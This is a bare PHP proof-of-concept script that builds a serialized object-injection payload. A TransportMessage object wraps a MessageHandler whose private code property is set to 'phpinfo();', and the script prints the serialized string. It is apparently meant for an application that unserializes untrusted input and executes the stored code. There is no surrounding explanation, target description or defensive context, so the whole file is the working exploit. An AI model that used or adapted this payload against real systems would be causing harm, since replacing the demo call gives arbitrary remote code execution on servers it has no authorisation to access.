<?php
class MessageHandler
{
   private $code = "phpinfo();";
}

class TransportMessage
{
   private $obj;

   function __construct()
   {
      $this->obj = new MessageHandler;
   }
}

print serialize(new TransportMessage);
